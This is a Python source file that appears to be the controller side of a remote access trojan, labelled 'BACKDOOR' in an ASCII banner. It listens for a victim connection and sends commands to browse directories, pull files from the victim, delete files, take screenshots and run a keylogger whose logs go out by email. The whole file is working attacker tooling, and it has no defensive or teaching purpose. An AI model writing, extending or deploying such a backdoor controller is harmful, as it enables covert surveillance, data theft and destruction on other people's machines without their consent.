import os
import socket
import datetime

s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host,port))
print("")
print("server is running @ ", host)
print("")
print("")
s.listen(1)
conn, addr = s.accept()
print("")


# connection has been completed
# command handling
    #menu
print("""

     
  sMMMMMMMmo    `NMMm`   `oNMNmNMm+ `MMo  .yMNo``MMMMMMNd+`   +mMMNNMMh-   :dMMNNMMd/  sMMMMMMMms`  
  sMN    +MM:   hMdNMs   dMm-   /NNs`MMo.yMNo`  `MMo  `-dMm` yMN/   `yMM: +MMo`  `+MMo sMM    .NMs  
  sMMyyyhNMs   +MM./MM/ :MM/        `MMmMMM-    `MMo    -MMo.MMo      NMh mMd      hMN sMM////sMN:  
  sMN////sMM/ -MMh::mMN.:MM/     ````MMNohMN/   `MMo    -MMo.MMo      NMh NMh      yMM sMMyyyhNMh`  
  sMN    -NMs`mMNddddNMh`mMm-   /MM+`MMo  oMMy` `MMo  `:dMm` hMN:   `sMM/ oMM+    +MMs sMM    /MM:  
  sMMMMMMMms`yMM-    /MMo`sNMNmNMd/ `MMo   :NMm-`MMMMMMMd+`   omMNmmMMd:   /dMMmmMMm+  sMM    :MM:  


[+]- view_cwd : access to diffrent directories
[+]- custom_dir : access to custom dir
[+]- download_file : download file from server
[+]- remove_file : remove a file or directory
[+]- capture : get shreenshot
[+]- log : keylogger   1:send   other:log
""")


while 1:
    print("")
    command = input(str("Command @PCWAEL #>>  "))
    if command == "view_cwd" :
        conn.send(command.encode())
        print("")
        print("command sent waitin for execution ...")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Command output : ", files)
        
    elif command == "custom_dir" :
        conn.send(command.encode())
        print("")
        user_input = input(str("custom dir : "))
        conn.send(user_input.encode())
        print("")
        print("command sent")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Custom Dir Result : ",files)
        
    elif command == "download_file" :
        conn.send(command.encode())
        filepath = input(str("File full path with name : "))
        conn.send(filepath.encode())
        file = conn.recv(100000)
        filename = input(str("file name with extenction : "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print("")
        print(filename, "downloaded and saved ")
        print("")
        
    elif command == "remove_file":
        conn.send(command.encode())
        fileanddir = input(str("enter file name and directory : "))
        conn.send(fileanddir.encode())
        print("")
        print("file removed")
        
    elif command == "capture":
        conn.send(command.encode())
        file = conn.recv(1000000)
        filename = input(str("file name with extenction : "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print("")
        print(filename, "downloaded and saved ")
        print("")
    elif command == "log":
        conn.send(command.encode())
        email = input(str("sending : "))
        conn.send(email.encode())
        print("command sended")

        
    else:
        print("try again!!!")

        
